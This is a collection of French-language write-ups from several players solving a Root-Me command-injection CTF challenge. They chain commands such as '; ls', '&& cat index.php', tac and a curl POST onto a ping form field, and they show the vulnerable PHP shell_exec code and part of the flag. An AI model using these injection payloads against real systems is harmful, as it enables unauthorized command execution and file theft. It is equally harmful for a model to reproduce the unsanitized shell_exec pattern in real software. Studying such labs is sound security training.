@@ -1,0 +1,171 @@
+En tapant le texte ci-dessous dans le champ texte du formulaire :
+127.0.0.1 ; ls
+
+nous avons en retour, le résultat de la commande ping et de la commande ls.
+
+Par curiosité, j’entre
+
+127.0.0.1 ; php -s index.php
+
+le ping est à nouveau effectué puis le code php de la page index.php est affiché avec la coloration syntaxique.
+Pourquoi index.php ? L’auteur(e) du challenge précise qu’il faut regarder ce fichier ; en effet, nous pouvons voir le code qui valide l’épreuve.
+
+ou
+
+Pour cette épreuve, l’auteur le nomme "injection de commande" et spécifie que le mot de passe est dans index.php.
+
+Sur la page web, nous remarquons un champ input.
+Testons donc une injection avec l’opérateur && pour commencer :
+
+127.0.0.1 && pwd
+/challenge/web-serveur/ch54
+
+Bingo, ça fonctionne !
+
+Testons alors un ls pour voir si le fichier index.php est bien présent :
+
+127.0.0.1 && ls
+index.php
+
+Bingo, ça fonctionne !
+
+Testons un cat pour lire le fichier :
+127.0.0.1 && cat index.php
+
+Malheureusement pas de résultat à part le ping.
+
+Testons un head pour lire le début de fichier :
+127.0.0.1 && head index.php
+
+Malheureusement toujours rien
+
+Tant qu’on y est testons un tail, opposé à head :
+
+127.0.0.1 && tail index.php
+$flag = "S3rv1ce...S3cure";
+if(isset($_POST["ip"]) && !empty($_POST["ip"])){
+        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
+        echo $response;
+}
+?>
+
+Bingo, notre flag est là !!!
+
+ou
+
+Tout d’abord,
+
+Dans le champs de saisie (où est indiqué 127.0.01),
+
+il suffit de rentrer un caractère d’échappement comme " ;" ou "||", afin de pouvoir saisir une autre commande interprétée.
+
+Par exemple, la saisie de ;ls listera les fichiers contenu dans le répertoire dans lequel nous nous trouvons.
+Il en est de même pour ||ls.
+
+On voit alors qu’il y a seulement le fichier index.php
+
+En faisant un  ;cat index.php | grep "flag" , nous obtenons le flag qui permet de valider le challenge.
+
+ou
+
+Nous avons un outil de ping et nous devons contourner son utilisation principale.
+
+Comme toujours, je suis allé au plus simple (pour moi).
+
+Commande :
+ ; pwd
+
+Résultat :
+/challenge/web-serveur/ch54
+
+Commande :
+ ; cat index.php
+
+Résultat :
+Le code est interprété donc ça ne fonctionne pas.
+
+Commande :
+ ; tac index.php
+
+Résultat :
+ ?> echo $response ; $response = shell_exec("ping -c 3 ".$ip) ; if(isset($_POST["ip"]) && !empty($_POST["ip"])) $ip = $_POST["ip"] ; $flag = "S3r[...]ure" ;
+
+tac : Cette commande va afficher ou concaténer des fichiers à l’envers.
+
+ou
+
+En supposant que nous sommes sur un serveur Linux, nous pouvons essayer d’utiliser l’opérateur && pour réaliser plusieurs commandes.
+
+En commençant par "127.0.0.1 && ls", nous remarquons que la commande ls est bien exécutée
+
+Sur mon navigateur, "127.0.0.1 && cat index.php" réinterprétait le php, et je ne pouvais donc pas voir le flag
+
+Pour récupérer le code source de la page, je l’ai donc exfiltré en base64 : "127.0.0.1 && cat index.php | base64"
+
+Il ne reste ensuite plus qu’à décoder le résultat obtenu, et le flag apparait
+
+ou
+
+Je me suis rendue compte qu’en tapant simplement
+; cat index.php
+
+le navigateur interprétait le code php.
+
+Après plusieurs tentatives de modification du dit fichier, j’ai fini par faire un :
+; sort index.php
+
+puisqu’il triait les lignes par ordre alphabétique avant de les afficher, le flag est apparu :
+Image(s) jointe(s)
+imprim_ecran_rootme-84bce.png?1628962023
+
+    Taille : 742 x 382
+    Poids : 12.3 ko
+    Format : PNG
+
+ou
+
+Cette épreuve me rappelle un cas rencontré sur le LAB d’une certif bien connue...
+
+Dans cette épreuve, on se rend compte que l’entrée utilisateur est envoyé directement à la commande ping (comme l’affichage le suggère d’ailleurs).
+On remarque également qu’aucune protection n’est appliquée si l’on essaie par exemple d’ajouter des options : -c 2 127.0.0.1.
+Pourquoi donc ne pas chaîner plusieurs commandes grâce à l’opérateur && sous linux :
+
+127.0.0.1 && pwd
+127.0.0.1 && ls
+127.0.0.1 && cat index.php
+
+> le mot de passe se trouve dans le code source !
+
+ou
+
+Tout d’abord, nous supposons que nous sommes sur un serveur Linux.
+
+Voici l’exemple d’une commande de ping sur Linux :
+ping google.com
+
+Le point-virgule est le séparateur de commande sous Linux et permet l’appel de plusieurs commandes en une seule entrée !
+Le premier test que j’ai pu effectuer est le suivant :
+127.0.0.1 ; ls
+
+On obtient donc la sortie de ls qui nous permet de voir l’existence d’un fichier index.php.
+Pour voir son contenu il suffit juste d’utiliser la commande "cat".
+
+L’input finale afin d’obtenir le flag est la suivante :
+127.0.0.1 ; cat index.php
+
+PS : Une utilisation d’autres séparateurs est possible :
+- Les pipes ’|’ .
+- Les ’&’ ou ’&&’.
+
+ou
+
+En bash on peut concaténer plusieurs commandes à la suite.
+C’est ce qu’on demande ici.
+
+Pour détourner le service il y a plusieurs solutions. Les solutions précédentes montrent les possibilités avec un navigateur.
+
+Il est aussi possible de résoudre le challenge via l’outil "curl". Pour cela il faut regarder le script PHP que le formulaire appelle, ici c’est "index.php" donc lui même, et l’entrer envoyer au formulaire est "ping".
+
+Via curl on va envoyer au formulaire en méthode POST la commande à exécuter : curl -X POST -F ’ping=127.0.0.1 && cat index.php’ http://challenge01.root-me.org/web-serveur/ch54/index.php
+
+Et voila on a directement le fichier index.php. Le mot de passe de validation apparaît sous la variable "flag".
